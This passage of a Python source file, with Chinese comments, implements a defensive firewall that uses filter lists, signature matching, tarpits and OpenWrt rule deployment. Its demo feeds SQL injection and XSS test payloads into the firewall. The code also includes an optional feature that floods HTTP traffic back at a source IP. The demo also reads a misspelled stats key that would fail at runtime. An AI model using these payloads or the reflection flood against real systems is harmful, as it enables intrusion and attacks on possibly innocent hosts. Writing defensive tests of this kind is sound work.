            'memory_recognitions': 0,  # 记忆识别次数
            'resource_scheduler_enabled': self._scheduler_enabled,
            'attack_memory_sosa': self._attack_memory_sosa,
            'fast_filters_enabled': self._filter_lists_enabled,
            'easytier_enabled': self._easytier_enabled,
            'openwrt_enabled': self._openwrt_enabled,
            'filter_list_blocks': 0,  # 快速过滤阻断次数
            'spamhaus_blocks': 0,  # Spamhaus阻断次数
            'email_phishing_blocks': 0,  # 邮件钓鱼阻断次数
            'openwrt_rules_deployed': 0,  # OpenWrt规则部署次数
        }

        # 自动清理线程
        self.running = False
        self.cleanup_thread = None

        # 输出配置信息
        mode = 'simulation' if simulation_mode else ('test' if test_mode else 'live')
        logger.info(f"  运行模式: {mode.upper()}")
        if simulation_mode:
            logger.warning(f"  ⚠️ 模拟模式 - 不会实际执行防御动作")
        elif test_mode:
            logger.warning(
                f"  ⚠️ 测试模式 - 仅限白名单IP ({len(self.test_whitelist_ips)}个) "
                f"和最多 {max_test_clients} 个客户端"
            )

        logger.info(f"  主动探测: {'✅' if enable_active_probing else '❌'}")
        logger.info(f"  HLIG检测: {'✅' if enable_hlig_detection else '❌'}")
        logger.info(f"  SYN Cookies: {'✅' if enable_syn_cookies else '❌'}")
        logger.info(f"  Tarpit: {'✅' if enable_tarpit else '❌'}")
        attack_memory_label = "✅ (SOSA增强)" if self._attack_memory_sosa else "✅"
        logger.info(f"  攻击记忆: {attack_memory_label if enable_attack_memory else '❌'}")
        logger.info(f"  智能调度: {'✅ (ET-WCN降温)' if self._scheduler_enabled else '❌'}")

        # 快速过滤清单详细信息
        if self._filter_lists_enabled:
            filter_label = "✅ (Spamhaus+邮件安全+灰名单)"
            logger.info(f"  快速过滤: {filter_label}")
        else:
            logger.info(f"  快速过滤: ❌")

        logger.info(f"  流量反射: {'⚠️  已启用' if enable_traffic_reflection else '❌'}")
        if self.enable_packet_capture:
            logger.info(f"  封包捕获: ✅ NFQueue (队列={nfqueue_num})")
        else:
            logger.info(f"  封包捕获: ❌ (手动输入模式)")

        # EasyTier + OpenWrt
        if self._easytier_enabled:
            et_net = easytier_config.get('network_name', 'hidrs-aegis') if easytier_config else 'hidrs-aegis'
            logger.info(f"  EasyTier: ✅ Mesh VPN (网络={et_net})")
        else:
            logger.info(f"  EasyTier: ❌")
        if self._openwrt_enabled:
            n_routers = len(openwrt_routers or [])
            logger.info(f"  OpenWrt:  ✅ 路由器集群 ({n_routers}台)")
        else:
            logger.info(f"  OpenWrt:  ❌")
        logger.info("=" * 60)

    def _on_mesh_topology_change(self, added, removed, peers, routes):
        """
        EasyTier Mesh 拓扑变化回调

        当新节点加入或离开时触发：
        - 新节点上线：同步当前黑名单到该节点对应的OpenWrt路由器
        - 节点离线：记录告警，更新拓扑状态
        """
        if added:
            logger.info(f"[HIDRSFirewall] Mesh 新节点: {added}")

            # 将当前黑名单IP同步到新节点的OpenWrt路由器
            if self._openwrt_enabled and self.openwrt_fleet:
                blacklisted_ips = list(self.reputation_system.blacklist)
                if blacklisted_ips:
                    logger.info(
                        f"[HIDRSFirewall] 同步 {len(blacklisted_ips)} 个黑名单IP到新节点"
                    )
                    # 找到新节点对应的路由器（通过Peer IP匹配路由器region）
                    peer_map = {p.peer_id: p for p in peers}
                    for peer_id in added:
                        peer = peer_map.get(peer_id)
                        if not peer:
                            continue
                        # 尝试找到该Peer IP对应的路由器
                        for router_id, router_info in self.openwrt_fleet._routers.items():
                            if router_info.host == peer.ipv4 or router_info.alias == peer_id:
                                self.openwrt_fleet.deploy_batch_block(
                                    blacklisted_ips,
                                    reason="aegis_blacklist_sync",
                                    target_routers=[router_id],
                                )
                                break

        if removed:
            logger.warning(f"[HIDRSFirewall] Mesh 节点离线: {removed}")

            # 节点离线可能意味着该节点被攻击或网络分区
            # 如果剩余节点数过低，提升整体威胁等级
            total_expected = len(peers) + len(removed)
            if total_expected > 0 and len(removed) / total_expected > 0.3:
                logger.critical(
                    f"[HIDRSFirewall] 超过30%节点离线 "
                    f"({len(removed)}/{total_expected})，可能遭受网络攻击"
                )

    def deploy_block_to_openwrt(self, ip: str, reason: str = "", ttl: int = 3600) -> bool:
        """
        将封锁规则部署到所有 OpenWrt 路由器

        参数:
            ip: 要封锁的IP
            reason: 封锁原因
            ttl: 有效期（秒），默认1小时

        返回:
            是否至少有一台路由器部署成功
        """
        if not self._openwrt_enabled or not self.openwrt_fleet:
            return False

        results = self.openwrt_fleet.deploy_block_rule(ip, reason=reason, ttl=ttl)
        success_count = sum(1 for v in results.values() if v)

        if success_count > 0:
            self.stats['openwrt_rules_deployed'] += 1

        return success_count > 0

    def get_mesh_topology(self) -> Optional[Dict[str, Any]]:
        """
        获取 EasyTier Mesh 网络拓扑（HLIG 格式）

        返回可直接传给 TopologyBuilder 的节点+边数据。
        """
        if not self._easytier_enabled or not self.easytier_manager:
            return None

        return self.easytier_manager.get_topology_for_hlig()

    def start(self):
        """启动防火墙"""
        self.running = True

        # 启动清理线程
        self.cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
        self.cleanup_thread.start()

        # 启动封包捕获（如果启用）
        if self.enable_packet_capture:
            self._start_packet_capture()

        # 启动 EasyTier Mesh VPN
        if self._easytier_enabled and self.easytier_manager:
            if self.easytier_manager.core_path:
                if self.easytier_manager.start_core():
                    logger.info("[HIDRSFirewall] EasyTier Mesh VPN 已启动")
                else:
                    logger.warning("[HIDRSFirewall] EasyTier 启动失败")
            elif self.easytier_manager.cli.available:
                # core 已经在外部运行，只启动拓扑监控
                self.easytier_manager._running = True
                self.easytier_manager._start_topology_poll()
                logger.info("[HIDRSFirewall] EasyTier 拓扑监控已启动（外部core）")

        # 连接 OpenWrt 路由器集群
        if self._openwrt_enabled and self.openwrt_fleet:
            connect_results = self.openwrt_fleet.connect_all()
            connected = sum(1 for v in connect_results.values() if v)
            total = len(connect_results)
            logger.info(f"[HIDRSFirewall] OpenWrt 路由器集群: {connected}/{total} 已连接")

        logger.info("[HIDRSFirewall] 防火墙已启动"
                     f" ({'封包捕获模式' if self._packet_capture else '手动输入模式'})")

    def _start_packet_capture(self):
        """
        启动真实封包捕获

        创建PacketCapture实例，绑定NFQueue，将捕获的封包
        路由到self.process_packet()进行完整的防御处理链。

        前置条件：
        - iptables规则已配置（将流量导入NFQUEUE）
        - 具有root权限
        - netfilterqueue和scapy已安装
        """
        try:
            from .packet_capture import PacketCapture

            self._packet_capture = PacketCapture(
                queue_num=self.nfqueue_num,
                packet_handler=self.process_packet,
            )
            self._packet_capture.start()
            logger.info(f"[HIDRSFirewall] 封包捕获已启动 (NFQueue={self.nfqueue_num})")

        except ImportError as e:
            logger.error(f"[HIDRSFirewall] 封包捕获启动失败: {e}")
            logger.error("[HIDRSFirewall] 请安装依赖: pip install netfilterqueue scapy")
            self._packet_capture = None

        except Exception as e:
            logger.error(f"[HIDRSFirewall] 封包捕获启动失败: {e}")
            logger.error("[HIDRSFirewall] 请确认: 1) root权限 2) iptables规则已配置")
            self._packet_capture = None

    def stop(self):
        """停止防火墙"""
        self.running = False

        # 停止封包捕获
        if self._packet_capture:
            self._packet_capture.stop()
            logger.info(f"[HIDRSFirewall] 封包捕获已停止 (stats={self._packet_capture.get_stats()})")

        # 停止 EasyTier
        if self._easytier_enabled and self.easytier_manager:
            self.easytier_manager.stop_core()
            logger.info("[HIDRSFirewall] EasyTier 已停止")

        # 断开 OpenWrt 连接
        if self._openwrt_enabled and self.openwrt_fleet:
            self.openwrt_fleet.disconnect_all()
            logger.info("[HIDRSFirewall] OpenWrt 路由器已断开")

        # 保存攻击记忆
        if self.attack_memory:
            self.attack_memory.save_memory()
            logger.info("[HIDRSFirewall] 攻击记忆已保存")

        logger.info("[HIDRSFirewall] 防火墙已停止")

    def process_packet(
        self,
        packet_data: bytes,
        src_ip: str,
        src_port: int,
        dst_ip: str,
        dst_port: int,
        protocol: str = 'tcp'
    ) -> Dict[str, Any]:
        """
        处理数据包

        返回:
        {
            'action': 'allow/block/tarpit',
            'reason': '...',
            'threat_level': 0-3
        }
        """
        self.stats['total_packets'] += 1

        # 0. 快速过滤清单检查（优先级最高）
        if self._filter_lists_enabled and self.filter_lists:
            filter_result = self.filter_lists.comprehensive_check(
                src_ip=src_ip,
                dst_ip=dst_ip,
                domain="",  # 如果有DNS信息可以传入
                payload=packet_data,
                dst_port=dst_port,
                ssl_sha256="",  # 如果有SSL信息可以传入
            )

            # 白名单立即放行
            if filter_result['action'] == 'allow':
                return {
                    'action': 'allow',
                    'reason': f"快速过滤白名单: {filter_result['reason']}",
                    'threat_level': ThreatLevel.CLEAN
                }

            # 黑名单立即阻断
            elif filter_result['action'] == 'block':
                self.stats['blocked_packets'] += 1
                self.stats['filter_list_blocks'] += 1

                # 统计Spamhaus阻断
                if 'spamhaus' in filter_result.get('matched_filters', []):
                    self.stats['spamhaus_blocks'] += 1

                # 统计邮件钓鱼阻断
                if filter_result.get('email_phishing') or filter_result.get('fbi_impersonation'):
                    self.stats['email_phishing_blocks'] += 1

                logger.warning(
                    f"[HIDRSFirewall] 🚫 快速过滤阻断: {src_ip}:{src_port} -> {dst_ip}:{dst_port} "
                    f"原因={filter_result['reason']}"
                )

                return {
                    'action': 'block',
                    'reason': f"快速过滤阻断: {filter_result['reason']}",
                    'threat_level': ThreatLevel.CRITICAL,
                    'filter_result': filter_result
                }

            # 灰名单标记（继续深度检测，但提高警惕）
            elif filter_result['action'] == 'greylist':
                logger.info(
                    f"[HIDRSFirewall] ⚠️ 灰名单匹配: {src_ip}:{src_port} -> {dst_ip}:{dst_port} "
                    f"原因={filter_result['reason']} - 将进行深度检测"
                )
                # 继续处理，但记录灰名单状态

        # 1. 检查IP信誉
        reputation = self.reputation_system.get_reputation(src_ip)

        if reputation == 0:
            self.stats['blocked_packets'] += 1
            return {
                'action': 'block',
                'reason': 'IP in blacklist',
                'threat_level': ThreatLevel.CRITICAL
            }

        # 2. DPI包分析
        analysis = self.packet_analyzer.analyze_packet(packet_data, src_ip, dst_ip)

        # 2.1 深度Payload检测（木马+IPSec）
        payload_analysis = {
            'malware_detected': False,
            'ipsec_detected': False,
            'signature_matched': False
        }

        # 如果攻击记忆系统启用了特征库（SOSA版本）
        if self._attack_memory_sosa and hasattr(self.attack_memory, 'signature_db'):
            signature_db = self.attack_memory.signature_db

            # 木马payload检测
            if len(packet_data) > 0:
                malware = signature_db.detect_malware_payload(packet_data)
                if malware:
                    payload_analysis['malware_detected'] = True
                    payload_analysis['malware_family'] = malware.malware_family
                    payload_analysis['malware_id'] = malware.malware_id
                    logger.critical(
                        f"[HIDRSFirewall] 🦠 检测到木马payload: {malware.malware_family} "
                        f"(来源={src_ip}:{src_port})"
                    )
                    # 立即标记为关键威胁
                    analysis['suspicious'] = True
                    if 'threat_indicators' not in analysis:
                        analysis['threat_indicators'] = []
                    analysis['threat_indicators'].append(f'MALWARE_{malware.malware_family}')

            # IPSec流量识别
            if protocol.upper() in ['ESP', 'AH'] or dst_port in [500, 4500]:  # IKE/IPSec端口
                ipsec_sig = signature_db.parse_ipsec_packet(packet_data)
                if ipsec_sig:
                    payload_analysis['ipsec_detected'] = True
                    payload_analysis['ipsec_spi'] = ipsec_sig.spi
                    payload_analysis['ipsec_protocol'] = ipsec_sig.protocol
                    logger.debug(
                        f"[HIDRSFirewall] 🔐 检测到IPSec流量: SPI=0x{ipsec_sig.spi:08x}, "
                        f"协议={ipsec_sig.protocol}"
                    )

                    # 检测IPSec异常
                    if ipsec_sig.abnormal_padding or ipsec_sig.abnormal_sequence:
                        logger.warning(
                            f"[HIDRSFirewall] ⚠️ IPSec异常: "
                            f"padding={ipsec_sig.abnormal_padding}, "
                            f"sequence={ipsec_sig.abnormal_sequence}"
                        )
                        analysis['suspicious'] = True
                        if 'threat_indicators' not in analysis:
                            analysis['threat_indicators'] = []
                        analysis['threat_indicators'].append('IPSEC_ANOMALY')

            # 攻击签名匹配
            sig = signature_db.match_packet(
                src_ip=src_ip,
                dst_ip=dst_ip,
                src_port=src_port,
                dst_port=dst_port,
                protocol=protocol.upper(),
                payload=packet_data,
                packet_rate=0.0,  # TODO: 从profile计算实时速率
                packet_size=len(packet_data)
            )

            if sig:
                payload_analysis['signature_matched'] = True
                payload_analysis['signature_id'] = sig.signature_id
                payload_analysis['attack_type'] = sig.attack_type
                payload_analysis['severity'] = sig.severity
                logger.warning(
                    f"[HIDRSFirewall] 🎯 签名匹配: {sig.signature_id} "
                    f"(严重度={sig.severity}, 类型={sig.attack_type})"
                )
                analysis['suspicious'] = True
                if 'threat_indicators' not in analysis:
                    analysis['threat_indicators'] = []
                analysis['threat_indicators'].append(f'SIG_{sig.signature_id}')
                # 更新attack_type
                if 'attack_type' not in analysis or not analysis['attack_type']:
                    analysis['attack_type'] = sig.attack_type

        if analysis['suspicious']:
            self.stats['suspicious_packets'] += 1
            self.reputation_system.report_suspicious(
                src_ip,
                ', '.join(analysis.get('threat_indicators', []))
            )

            # 2.2 攻击记忆系统：快速识别已知攻击模式
            if self.attack_memory and analysis.get('threat_indicators'):
                recognized_pattern = self.attack_memory.recognize_attack(analysis['threat_indicators'])

                if recognized_pattern:
                    self.stats['memory_recognitions'] += 1
                    logger.info(
                        f"[HIDRSFirewall] 🧠 识别到已知攻击模式: {recognized_pattern.pattern_id} "
                        f"(出现过 {recognized_pattern.occurrence_count} 次)"
                    )

                # 学习本次攻击（更新频率）
                # 如果是SOSA版本，传递payload和额外参数
                attack_type = recognized_pattern.attack_type if recognized_pattern else analysis.get('attack_type', 'unknown')

                if self._attack_memory_sosa:
                    # SOSA版本：支持payload分析
                    self.attack_memory.learn_attack(
                        src_ip=src_ip,
                        attack_type=attack_type,
                        signatures=analysis['threat_indicators'],
                        packet_size=len(packet_data),
                        success=False,
                        port=dst_port,
                        payload=packet_data,  # 传递payload
                        dst_ip=dst_ip,
                        protocol=protocol.upper()
                    )
                else:
                    # 基础版本：不传递payload
                    self.attack_memory.learn_attack(
                        src_ip=src_ip,
                        attack_type=attack_type,
                        signatures=analysis['threat_indicators'],
                        packet_size=len(packet_data),
                        success=False,
                        port=dst_port
                    )

        # 3. 获取或创建连接画像
        if src_ip not in self.connections:
            self.connections[src_ip] = ConnectionProfile(
                ip=src_ip,
                port=src_port,
                first_seen=datetime.utcnow(),
                last_seen=datetime.utcnow(),
                packet_count=0,
                byte_count=0,
                protocol=protocol
            )

        profile = self.connections[src_ip]
        profile.last_seen = datetime.utcnow()
        profile.packet_count += 1
        profile.byte_count += len(packet_data)

        # 4. HLIG异常检测
        if self.hlig_detector:
            self.hlig_detector.add_traffic_sample(profile)
            is_anomaly, anomaly_score = self.hlig_detector.detect_anomaly(profile)

            profile.fiedler_anomaly_score = anomaly_score

            if is_anomaly:
                logger.warning(f"[HIDRSFirewall] HLIG异常检测: {src_ip} (得分: {anomaly_score:.2f})")
                profile.threat_level = ThreatLevel.SUSPICIOUS

        # 5. 主动探测（针对可疑IP）
        if self.active_prober and profile.threat_level >= ThreatLevel.SUSPICIOUS:
            if not self.active_prober.is_known_scanner(src_ip):
                self.stats['active_probes'] += 1

                probe_result = self.active_prober.probe_suspicious_ip(src_ip, src_port)

                if probe_result['is_scanner']:
                    logger.warning(f"[HIDRSFirewall] 检测到扫描器: {src_ip}")
                    profile.threat_level = ThreatLevel.MALICIOUS
                    self.reputation_system.report_malicious(src_ip, 'Scanner detected')

        # 6. 决策（考虑运行模式）
        action = 'allow'
        reason = 'Normal traffic'

        # 检查是否应该执行防御（根据模式）
        should_defend = True
        defense_reason = 'live_mode'

        if self.attack_memory and profile.threat_level >= ThreatLevel.SUSPICIOUS:
            # 使用攻击记忆系统判断是否防御
            attack_type = analysis.get('attack_type', 'unknown') if analysis.get('suspicious') else 'suspicious'
            should_defend, defense_reason = self.attack_memory.should_defend_against(src_ip, attack_type)

        if profile.threat_level == ThreatLevel.CRITICAL:
            if should_defend:
                action = 'block'
                reason = 'Critical threat'

                # 同步封锁到OpenWrt路由器集群
                if self._openwrt_enabled and self.openwrt_fleet:
                    self.deploy_block_to_openwrt(
                        src_ip,
                        reason=f"CRITICAL: {analysis.get('attack_type', 'unknown')}",
                        ttl=3600,
                    )

                # 可选：反射攻击
                if self.reflector.enable_reflection:
                    self.reflector.reflect_attack(src_ip, 'http_flood', 100)
                    self.stats['reflected_attacks'] += 1
            else:
                action = 'allow'
                reason = f'Critical threat (not defended: {defense_reason})'
                if self.simulation_mode:
                    logger.info(f"[HIDRSFirewall] 🎬 模拟模式：将阻断 {src_ip}")
                elif self.test_mode:
                    logger.debug(f"[HIDRSFirewall] 测试模式：{src_ip} 未在白名单，跳过阻断")

        elif profile.threat_level == ThreatLevel.MALICIOUS:
            if should_defend:
                # Tarpit攻击者
                if self.tarpit:
                    self.tarpit.add_to_tarpit(src_ip)
                    action = 'tarpit'
                    reason = 'Malicious activity'
                    self.stats['tarpitted_connections'] += 1
            else:
                action = 'allow'
                reason = f'Malicious activity (not defended: {defense_reason})'
                if self.simulation_mode:
                    logger.info(f"[HIDRSFirewall] 🎬 模拟模式：将Tarpit {src_ip}")

        elif profile.threat_level == ThreatLevel.SUSPICIOUS:
            if should_defend:
                # 可疑流量，降低优先级但不阻断
                action = 'rate_limit'
                reason = 'Suspicious pattern detected'
            else:
                action = 'allow'
                reason = f'Suspicious pattern (not defended: {defense_reason})'

        # 7. 智能资源调度（ET-WCN降温算法）
        schedule_info = None
        if self.resource_scheduler:
            is_attack = (profile.threat_level >= ThreatLevel.SUSPICIOUS)
            attack_type_str = analysis.get('attack_type', 'unknown') if analysis.get('suspicious') else None

            resource_profile, schedule_info = self.resource_scheduler.process_traffic_event(
                is_attack=is_attack,
                attack_type=attack_type_str,
                threat_level=profile.threat_level,
                packet_count=1
            )

            # 根据资源调度器的建议动态调整防御组件
            # 注意：这里只是建议，实际组件开关在运行时不修改
            # 但可以影响下一个包的处理决策

        return {
            'action': action,
            'reason': reason,
            'threat_level': profile.threat_level,
            'reputation': reputation,
            'anomaly_score': profile.fiedler_anomaly_score,
            'defense_mode': defense_reason,
            'scheduler_info': schedule_info  # 添加调度器信息
        }

    def _cleanup_loop(self):
        """清理循环"""
        cleanup_counter = 0

        while self.running:
            try:
                time.sleep(300)  # 5分钟
                cleanup_counter += 1

                # 清理过期连接
                now = datetime.utcnow()
                expired = [
                    ip for ip, profile in self.connections.items()
                    if (now - profile.last_seen).total_seconds() > 600  # 10分钟
                ]

                for ip in expired:
                    del self.connections[ip]

                # 清理SYN Cookie
                if self.syn_cookie:
                    self.syn_cookie.cleanup_expired()

                # 每小时清理一次旧记忆（12次 * 5分钟 = 60分钟）
                if self.attack_memory and cleanup_counter % 12 == 0:
                    self.attack_memory.cleanup_old_memories(days=30)
                    self.attack_memory.save_memory()

                logger.debug(f"[HIDRSFirewall] 清理完成，移除 {len(expired)} 个过期连接")

            except Exception as e:
                logger.error(f"[HIDRSFirewall] 清理错误: {e}")

    def get_stats(self) -> Dict[str, Any]:
        """获取统计信息"""
        stats = {
            **self.stats,
            'active_connections': len(self.connections),
            'blacklisted_ips': len(self.reputation_system.blacklist),
            'whitelisted_ips': len(self.reputation_system.whitelist),
            'packet_capture_enabled': self._packet_capture is not None,
        }

        # 添加封包捕获统计
        if self._packet_capture:
            stats['packet_capture'] = self._packet_capture.get_stats()

        # 添加tarpit连接统计
        if self.tarpit:
            stats['tarpitted_ips'] = len(self.tarpit.tarpitted_ips)
            stats['tarpit_active_connections'] = len(self.tarpit.tarpitted_connections)

        # 添加攻击记忆统计
        if self.attack_memory:
            memory_stats = self.attack_memory.get_stats()
            stats['attack_memory'] = memory_stats

        # 添加 EasyTier 统计
        if self._easytier_enabled and self.easytier_manager:
            stats['easytier'] = self.easytier_manager.get_stats()

        # 添加 OpenWrt 统计
        if self._openwrt_enabled and self.openwrt_fleet:
            stats['openwrt'] = self.openwrt_fleet.stats

        return stats

    def get_threat_report(self) -> Dict[str, Any]:
        """获取威胁报告"""
        threats = {
            'critical': [],
            'malicious': [],
            'suspicious': []
        }

        for ip, profile in self.connections.items():
            if profile.threat_level == ThreatLevel.CRITICAL:
                threats['critical'].append({
                    'ip': ip,
                    'threat_score': profile.threat_score,
                    'anomaly_score': profile.fiedler_anomaly_score,
                    'patterns': profile.suspicious_patterns
                })
            elif profile.threat_level == ThreatLevel.MALICIOUS:
                threats['malicious'].append({
                    'ip': ip,
                    'threat_score': profile.threat_score,
                    'anomaly_score': profile.fiedler_anomaly_score
                })
            elif profile.threat_level == ThreatLevel.SUSPICIOUS:
                threats['suspicious'].append({
                    'ip': ip,
                    'anomaly_score': profile.fiedler_anomaly_score
                })

        return threats

    def get_top_threats(self, limit: int = 10) -> List[Dict]:
        """
        获取威胁最高的攻击者（基于记忆系统）

        参数:
        - limit: 返回数量限制

        返回:
        - 攻击者列表（按威胁分排序）
        """
        if not self.attack_memory:
            return []

        top_profiles = self.attack_memory.get_top_threats(limit=limit)

        return [
            {
                'ip': profile.ip,
                'threat_score': profile.threat_score,
                'total_attacks': profile.total_attacks,
                'attack_types': profile.attack_types,
                'sophistication_level': profile.sophistication_level,
                'first_attack': profile.first_attack.isoformat(),
                'last_attack': profile.last_attack.isoformat()
            }
            for profile in top_profiles
        ]

    def predict_next_attack(self, ip: str) -> Optional[Dict]:
        """
        预测指定IP的下一步攻击

        参数:
        - ip: 攻击者IP

        返回:
        - 预测信息（如果有历史记录）
        """
        if not self.attack_memory:
            return None

        return self.attack_memory.predict_next_attack(ip)

    def get_simulation_log(self, limit: int = 100) -> Dict:
        """
        获取模拟日志（仅模拟模式）

        参数:
        - limit: 返回条目数限制

        返回:
        - 模拟日志
        """
        if not self.attack_memory:
            return {'error': '攻击记忆系统未启用'}

        return self.attack_memory.get_simulation_log(limit=limit)

    def get_memory_stats(self) -> Dict:
        """获取攻击记忆系统统计信息"""
        if not self.attack_memory:
            return {'error': '攻击记忆系统未启用'}

        return self.attack_memory.get_stats()


# 使用示例
if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    print("🛡️  HIDRS反向防火墙演示")
    print("=" * 70)

    # ========== 示例1: 正式模式 ==========
    print("\n【示例1：正式模式 (Live Mode)】")
    print("-" * 70)

    firewall_live = HIDRSFirewall(
        enable_active_probing=True,
        enable_hlig_detection=True,
        enable_syn_cookies=True,
        enable_tarpit=True,
        enable_traffic_reflection=False,
        enable_attack_memory=True
    )

    firewall_live.start()

    # 模拟SQL注入攻击
    print("\n测试: SQL注入攻击")
    result = firewall_live.process_packet(
        b"GET /?id=1' OR 1=1-- HTTP/1.1\r\n",
        '5.6.7.8',
        54321,
        '10.0.0.1',
        80,
        'tcp'
    )
    print(f"结果: {result}")

    # 显示统计
    print("\n统计信息:")
    stats = firewall_live.get_stats()
    print(f"  总包数: {stats['total_packets']}")
    print(f"  可疑包数: {stats['suspicious_packets']}")
    print(f"  记忆识别: {stats['memory_recognitions']}")
    if 'attack_memory' in stats:
        print(f"  已知模式: {stats['attack_memory']['total_patterns']}")
        print(f"  已知攻击者: {stats['attack_memory']['total_attackers']}")

    firewall_live.stop()

    # ========== 示例2: 模拟模式 ==========
    print("\n\n【示例2：模拟模式 (Simulation Mode)】")
    print("-" * 70)

    firewall_sim = HIDRSFirewall(
        enable_active_probing=True,
        enable_hlig_detection=True,
        enable_attack_memory=True,
        simulation_mode=True  # 启用模拟模式
    )

    firewall_sim.start()

    # 模拟攻击
    print("\n测试: XSS攻击（模拟模式）")
    result = firewall_sim.process_packet(
        b"GET /?msg=<script>alert('XSS')</script> HTTP/1.1\r\n",
        '8.8.8.8',
        12345,
        '10.0.0.1',
        80,
        'tcp'
    )
    print(f"结果: {result}")
    print(f"  动作: {result['action']} (模拟模式不会实际阻断)")
    print(f"  防御模式: {result.get('defense_mode', 'N/A')}")

    # 查看模拟日志
    print("\n模拟日志:")
    sim_log = firewall_sim.get_simulation_log(limit=5)
    if 'logs' in sim_log:
        print(f"  总日志数: {sim_log['total']}")
        for log in sim_log['logs'][:3]:
            print(f"  - {log['action']}: {log['timestamp']}")

    firewall_sim.stop()

    # ========== 示例3: 测试模式 ==========
    print("\n\n【示例3：测试模式 (Test Mode)】")
    print("-" * 70)

    firewall_test = HIDRSFirewall(
        enable_active_probing=True,
        enable_hlig_detection=True,
        enable_attack_memory=True,
        test_mode=True,
        test_whitelist_ips=['192.168.1.0/24', '10.0.0.1'],
        max_test_clients=5
    )

    firewall_test.start()

    # 测试白名单IP
    print("\n测试1: 白名单IP (192.168.1.100)")
    result = firewall_test.process_packet(
        b"GET /?malicious=true HTTP/1.1\r\n",
        '192.168.1.100',
        12345,
        '10.0.0.1',
        80,
        'tcp'
    )
    print(f"  动作: {result['action']}")
    print(f"  防御模式: {result.get('defense_mode', 'N/A')}")

    # 测试非白名单IP
    print("\n测试2: 非白名单IP (1.2.3.4)")
    result = firewall_test.process_packet(
        b"GET /?malicious=true HTTP/1.1\r\n",
        '1.2.3.4',
        12345,
        '10.0.0.1',
        80,
        'tcp'
    )
    print(f"  动作: {result['action']}")
    print(f"  防御模式: {result.get('defense_mode', 'N/A')}")

    firewall_test.stop()

    # ========== 完整功能演示 ==========
    print("\n\n【完整功能演示】")
    print("-" * 70)

    firewall = HIDRSFirewall(
        enable_active_probing=True,
        enable_hlig_detection=True,
        enable_syn_cookies=True,
        enable_tarpit=True,
        enable_traffic_reflection=False,
        enable_attack_memory=True
    )

    firewall.start()

    # 正常流量
    print("\n测试1: 正常流量")
    result = firewall.process_packet(
        b'GET / HTTP/1.1\r\nHost: example.com\r\n',
        '1.2.3.4',
        12345,
        '10.0.0.1',
        80,
        'tcp'
    )
    print(f"  动作: {result['action']}, 原因: {result['reason']}")

    # SQL注入攻击
    print("\n测试2: SQL注入攻击")
    result = firewall.process_packet(
        b"GET /?id=1' OR 1=1-- HTTP/1.1\r\n",
        '5.6.7.8',
        54321,
        '10.0.0.1',
        80,
        'tcp'
    )
    print(f"  动作: {result['action']}, 原因: {result['reason']}")

    # HTTP Flood
    print("\n测试3: HTTP Flood (100个请求)")
    for i in range(100):
        result = firewall.process_packet(
            b'GET / HTTP/1.1\r\n',
            '9.10.11.12',
            10000 + i,
            '10.0.0.1',
            80,
            'tcp'
        )
    print(f"  最终动作: {result['action']}, 原因: {result['reason']}")

    # 统计信息
    print("\n统计信息:")
    stats = firewall.get_stats()
    print(f"  总包数: {stats['total_packets']}")
    print(f"  阻断包数: {stats['blocked_packets']}")
    print(f"  可疑包数: {stats['suspicious_packets']}")
    print(f"  Tarpit连接: {stats['tarpitted_connections']}")
    print(f"  记忆识别: {stats['memory_recognizations']}")
    print(f"  活跃连接: {stats['active_connections']}")

    # 攻击记忆统计
    if 'attack_memory' in stats:
        mem_stats = stats['attack_memory']
        print(f"\n攻击记忆统计:")
        print(f"  运行模式: {mem_stats['mode']}")
        print(f"  已知模式: {mem_stats['total_patterns']}")
        print(f"  已知攻击者: {mem_stats['total_attackers']}")
        print(f"  记忆的攻击: {mem_stats['total_attacks_remembered']}")
        print(f"  平均威胁分: {mem_stats['average_threat_score']:.1f}")

    # Top威胁
    print("\nTop 5威胁:")
    top_threats = firewall.get_top_threats(limit=5)
    for i, threat in enumerate(top_threats, 1):
        print(f"  {i}. {threat['ip']} - 威胁分: {threat['threat_score']:.1f}, "
              f"攻击次数: {threat['total_attacks']}, "
              f"复杂度: {threat['sophistication_level']}/5")

    # 预测攻击
    if top_threats:
        top_ip = top_threats[0]['ip']
        print(f"\n预测 {top_ip} 的下一步攻击:")
        prediction = firewall.predict_next_attack(top_ip)
        if prediction:
            print(f"  预测类型: {prediction['predicted_type']}")
            print(f"  置信度: {prediction['confidence']}%")
            print(f"  可能端口: {prediction['predicted_ports']}")

    # 威胁报告
    print("\n威胁报告:")
    threats = firewall.get_threat_report()
    for level, items in threats.items():
        print(f"  {level.upper()}: {len(items)} 个")

    firewall.stop()
    print("\n" + "=" * 70)
    print("演示完成！")
